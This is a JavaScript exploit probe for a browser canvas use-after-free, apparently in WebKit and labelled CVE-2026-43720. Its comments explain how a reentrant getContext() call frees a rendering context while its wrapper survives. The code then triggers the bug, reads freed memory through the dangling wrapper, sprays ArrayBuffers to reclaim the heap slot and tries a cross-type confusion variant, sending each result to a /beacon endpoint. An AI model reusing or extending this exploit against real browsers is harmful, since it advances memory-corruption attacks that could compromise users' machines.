// p460-canvas-uaf.js — CVE-2026-43720: reentrant getContext() UAF
//
// HTMLCanvasElement::getContext() checks m_context, then calls
// convert<IDLDictionary>() which invokes JS property getters.
// Getter re-enters getContext() on same canvas → m_context set.
// Outer call proceeds to createContext2d() → overwrites m_context
// via unique_ptr → inner context FREED while JS wrapper alive.
//
// WK-1400 IsoMalloc falls back to FastMalloc → same heap as ABs.
// No wrapper invalidation in destructor. ref()/deref() → canvas.
//
// Tests:
// A: Trigger UAF, confirm dangling wrapper survives
// B: Read properties from dangling wrapper (info leak probe)
// C: Spray ArrayBuffers then read through dangling wrapper
// D: Multiple rounds for stability
(function() {
    var RUN = 'p460-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Trigger reentrant getContext UAF
    // ═══════════════════════════════════════════════════════════════
    var innerCtx = null;
    var outerCtx = null;
    var canvas = null;
    try {
        canvas = document.createElement('canvas');
        canvas.width = 100;
        canvas.height = 100;
        document.body.appendChild(canvas);

        var thenCount = 0;
        var settings = {};
        Object.defineProperty(settings, 'desynchronized', {
            get: function() {
                thenCount++;
                if (thenCount === 1) {
                    innerCtx = canvas.getContext('2d');
                }
                return false;
            }
        });

        outerCtx = canvas.getContext('2d', settings);

        B('A-RESULT', {
            thenCount: thenCount,
            innerType: typeof innerCtx,
            outerType: typeof outerCtx,
            same: innerCtx === outerCtx,
            innerExists: !!innerCtx,
            outerExists: !!outerCtx
        });
    } catch(e) { B('A-ERR', e.message.slice(0,300)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST B: Read properties from dangling wrapper
    // If inner context was freed, these reads hit freed memory.
    // Each read is wrapped individually to find which one crashes.
    // ═══════════════════════════════════════════════════════════════
    try {
        if (innerCtx && innerCtx !== outerCtx) {
            var reads = {};

            // Simple scalar reads - these access state() which reads m_stateStack.last()
            try { reads.lineWidth = innerCtx.lineWidth; } catch(e) { reads.lineWidth = 'ERR:' + e.message.slice(0,60); }
            B('B-1', reads);

            try { reads.globalAlpha = innerCtx.globalAlpha; } catch(e) { reads.globalAlpha = 'ERR:' + e.message.slice(0,60); }
            B('B-2', reads);

            try { reads.shadowBlur = innerCtx.shadowBlur; } catch(e) { reads.shadowBlur = 'ERR:' + e.message.slice(0,60); }
            B('B-3', reads);

            try { reads.shadowOffsetX = innerCtx.shadowOffsetX; } catch(e) { reads.shadowOffsetX = 'ERR:' + e.message.slice(0,60); }
            B('B-4', reads);

            // String reads - these dereference String objects
            try { reads.fillStyle = '' + innerCtx.fillStyle; } catch(e) { reads.fillStyle = 'ERR:' + e.message.slice(0,60); }
            B('B-5', reads);

            try { reads.font = '' + innerCtx.font; } catch(e) { reads.font = 'ERR:' + e.message.slice(0,60); }
            B('B-6', reads);

            // Boolean reads
            try { reads.imageSmoothingEnabled = innerCtx.imageSmoothingEnabled; } catch(e) { reads.imageSmoothingEnabled = 'ERR:' + e.message.slice(0,60); }
            B('B-7', reads);

            B('B-RESULT', reads);
        } else if (innerCtx === outerCtx) {
            B('B-SKIP', 'inner===outer, reentry might not work');
        } else {
            B('B-SKIP', 'no innerCtx');
        }
    } catch(e) { B('B-ERR', e.message.slice(0,300)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST C: Spray ArrayBuffers then read through dangling wrapper
    // Goal: reclaim freed context memory with AB data, then read
    // through the dangling wrapper to confirm we see AB contents.
    // ═══════════════════════════════════════════════════════════════
    try {
        var canvas2 = document.createElement('canvas');
        canvas2.width = 100;
        canvas2.height = 100;
        document.body.appendChild(canvas2);

        var innerCtx2 = null;
        var outerCtx2 = null;
        var thenCount2 = 0;

        var settings2 = {};
        Object.defineProperty(settings2, 'desynchronized', {
            get: function() {
                thenCount2++;
                if (thenCount2 === 1) {
                    innerCtx2 = canvas2.getContext('2d');
                }
                return false;
            }
        });

        outerCtx2 = canvas2.getContext('2d', settings2);

        if (innerCtx2 && innerCtx2 !== outerCtx2) {
            // Inner context freed. Now spray ABs of various sizes to reclaim.
            // CanvasRenderingContext2D is large (~500-1000 bytes)
            var abs = [];
            var sizes = [512, 768, 1024, 1536, 2048];
            for (var si = 0; si < sizes.length; si++) {
                for (var i = 0; i < 200; i++) {
                    var ab = new ArrayBuffer(sizes[si]);
                    var view = new Uint8Array(ab);
                    // Fill with marker pattern: 0x41 + size index
                    for (var j = 0; j < view.length; j++) {
                        view[j] = 0x41 + si;
                    }
                    abs.push(ab);
                }
            }

            B('C-SPRAYED', { totalABs: abs.length });

            // Now read from dangling wrapper
            var creads = {};
            try { creads.lineWidth = innerCtx2.lineWidth; } catch(e) { creads.lineWidth = 'ERR:' + e.message.slice(0,60); }
            try { creads.globalAlpha = innerCtx2.globalAlpha; } catch(e) { creads.globalAlpha = 'ERR:' + e.message.slice(0,60); }
            try { creads.shadowBlur = innerCtx2.shadowBlur; } catch(e) { creads.shadowBlur = 'ERR:' + e.message.slice(0,60); }

            // Check if doubles look like our marker pattern
            // 0x4141414141414141 as double = 2.2308538223e+6 (approximately)
            // 0x4242424242424242 as double = 1.4834908e+13
            creads.lineWidthHex = '';
            try {
                var buf = new ArrayBuffer(8);
                var f64 = new Float64Array(buf);
                var u8 = new Uint8Array(buf);
                f64[0] = creads.lineWidth;
                creads.lineWidthHex = '';
                for (var i = 0; i < 8; i++) creads.lineWidthHex += ('0' + u8[i].toString(16)).slice(-2);
            } catch(e) {}

            try {
                var buf2 = new ArrayBuffer(8);
                var f64b = new Float64Array(buf2);
                var u8b = new Uint8Array(buf2);
                f64b[0] = creads.globalAlpha;
                creads.globalAlphaHex = '';
                for (var i = 0; i < 8; i++) creads.globalAlphaHex += ('0' + u8b[i].toString(16)).slice(-2);
            } catch(e) {}

            B('C-RESULT', creads);
        } else {
            B('C-SKIP', innerCtx2 === outerCtx2 ? 'same ctx' : 'no inner');
        }
    } catch(e) { B('C-ERR', e.message.slice(0,300)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST D: BitmapRenderer variant — different context type
    // If 2d doesn't work, try with bitmaprenderer which has fewer
    // fields and might be easier to groom
    // ═══════════════════════════════════════════════════════════════
    try {
        var canvas3 = document.createElement('canvas');
        canvas3.width = 100;
        canvas3.height = 100;
        document.body.appendChild(canvas3);

        var innerCtx3 = null;
        var outerCtx3 = null;
        var thenCount3 = 0;

        // For bitmaprenderer, the settings dictionary is ImageBitmapRenderingContextSettings
        // with a single 'alpha' property
        var settings3 = {};
        Object.defineProperty(settings3, 'alpha', {
            get: function() {
                thenCount3++;
                if (thenCount3 === 1) {
                    innerCtx3 = canvas3.getContext('bitmaprenderer');
                }
                return true;
            }
        });

        outerCtx3 = canvas3.getContext('bitmaprenderer', settings3);

        B('D-RESULT', {
            thenCount: thenCount3,
            innerExists: !!innerCtx3,
            outerExists: !!outerCtx3,
            same: innerCtx3 === outerCtx3
        });
    } catch(e) { B('D-ERR', e.message.slice(0,300)); }

    // ═══════════════════════════════════════════════════════════════
    // TEST E: Cross-type confusion — inner=2d, outer=bitmaprenderer
    // This creates a 2d context that gets freed, then the slot is
    // used for a bitmaprenderer context. The dangling 2d wrapper
    // accesses a completely different object type!
    // ═══════════════════════════════════════════════════════════════
    try {
        var canvas4 = document.createElement('canvas');
        canvas4.width = 100;
        canvas4.height = 100;
        document.body.appendChild(canvas4);

        var innerCtx4 = null;
        var outerCtx4 = null;
        var thenCount4 = 0;

        // Create a 2d context in the getter, but the outer call requests bitmaprenderer
        // Wait — this won't work because the outer call checks contextId BEFORE convert.
        // Let me think... the outer call for bitmaprenderer creates a bitmaprenderer context.
        // But the inner call (from getter) can create a 2d context.
        // Then the outer createContextBitmapRenderer() overwrites m_context with a new
        // ImageBitmapRenderingContext, freeing the inner 2d context.

        // Actually: the inner getContext('2d') creates a 2d context.
        // The outer getContext('bitmaprenderer', settings3) enters the bitmaprenderer branch.
        // But wait — the outer call checks m_context at line 226 FIRST.
        // At that point m_context is null. Falls through to line 277 (bitmaprenderer branch).
        // convert<ImageBitmapRenderingContextSettings> calls getter → inner getContext('2d') sets m_context.
        // Then createContextBitmapRenderer() → ASSERT(!m_context) (no-op) → m_context = new bitmaprenderer.
        // The 2d context is freed!

        var settings4 = {};
        Object.defineProperty(settings4, 'alpha', {
            get: function() {
                thenCount4++;
                if (thenCount4 === 1) {
                    innerCtx4 = canvas4.getContext('2d');
                }
                return true;
            }
        });

        outerCtx4 = canvas4.getContext('bitmaprenderer', settings4);

        B('E-INFO', {
            thenCount: thenCount4,
            innerExists: !!innerCtx4,
            outerExists: !!outerCtx4,
            same: innerCtx4 === outerCtx4,
            innerIs2d: innerCtx4 ? ('fillRect' in innerCtx4) : null,
            outerIsBR: outerCtx4 ? ('transferFromImageBitmap' in outerCtx4) : null
        });

        if (innerCtx4 && innerCtx4 !== outerCtx4) {
            // innerCtx4 is a freed 2d context. outerCtx4 is a live bitmaprenderer.
            // But the freed memory might be reused for the bitmaprenderer context
            // (since IsoMalloc → FastMalloc, same heap).
            var ereads = {};
            try { ereads.lineWidth = innerCtx4.lineWidth; } catch(e) { ereads.lineWidth = 'ERR:' + e.message.slice(0,60); }
            try { ereads.globalAlpha = innerCtx4.globalAlpha; } catch(e) { ereads.globalAlpha = 'ERR:' + e.message.slice(0,60); }
            try { ereads.fillStyle = '' + innerCtx4.fillStyle; } catch(e) { ereads.fillStyle = 'ERR:' + e.message.slice(0,60); }
            B('E-RESULT', ereads);
        }
    } catch(e) { B('E-ERR', e.message.slice(0,300)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
